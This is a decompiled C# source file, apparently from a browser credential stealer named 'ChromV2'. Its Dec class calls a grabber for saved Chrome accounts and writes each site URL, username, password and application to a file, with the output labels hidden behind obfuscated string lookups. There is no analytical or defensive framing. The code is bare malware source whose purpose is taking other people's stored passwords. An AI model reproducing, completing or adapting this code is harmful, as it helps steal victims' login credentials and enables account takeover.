using System;
using System.Collections.Generic;
using System.IO;
using SmartAssembly.StringsEncoding;

namespace ChromV2
{
	// Token: 0x02000074 RID: 116
	public class Dec
	{
		// Token: 0x06000275 RID: 629 RVA: 0x0001400C File Offset: 0x0001220C
		public static void Decrypt(string path)
		{
			List<Account> list = Chrom.Grab();
			File.WriteAllText(path + ChromV265450.Strings.Get(107394218), ChromV265450.Strings.Get(107394229));
			foreach (Account account in list)
			{
				File.AppendAllText(path + ChromV265450.Strings.Get(107394218), ChromV265450.Strings.Get(107394228) + account.URL + Environment.NewLine);
				File.AppendAllText(path + ChromV265450.Strings.Get(107394218), ChromV265450.Strings.Get(107394187) + account.UserName + Environment.NewLine);
				File.AppendAllText(path + ChromV265450.Strings.Get(107394218), ChromV265450.Strings.Get(107394202) + account.Password + Environment.NewLine);
				File.AppendAllText(path + ChromV265450.Strings.Get(107394218), ChromV265450.Strings.Get(107394153) + account.Application + Environment.NewLine);
				File.AppendAllText(path + ChromV265450.Strings.Get(107394218), ChromV265450.Strings.Get(107394164) + Environment.NewLine);
				Dec.colvo++;
			}
		}

		// Token: 0x04000121 RID: 289
		public static int colvo;
	}
}
